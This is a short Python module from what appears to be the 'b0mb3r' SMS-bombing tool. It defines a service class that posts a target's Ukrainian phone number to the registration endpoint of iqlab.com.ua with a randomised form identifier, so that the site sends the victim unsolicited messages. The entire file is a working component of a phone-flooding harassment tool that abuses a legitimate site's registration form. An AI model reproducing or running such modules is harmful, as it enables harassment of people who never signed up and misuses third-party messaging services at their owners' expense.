from b0mb3r.services.service import Service
from random import randint


class IQLab(Service):
    phone_codes = [380]

    async def run(self):
        ajax_form = randint(11111, 99999)

        await self.post(
            "https://iqlab.com.ua/session/ajaxregister",
            data={
                "cellphone": self.format(self.formatted_phone, " ** (***) *** ** **"),
                "isAjaxForm": f"registerForm_{ajax_form}",
                "isAjax": 1,
                "unique_id": ajax_form,
            },
        )
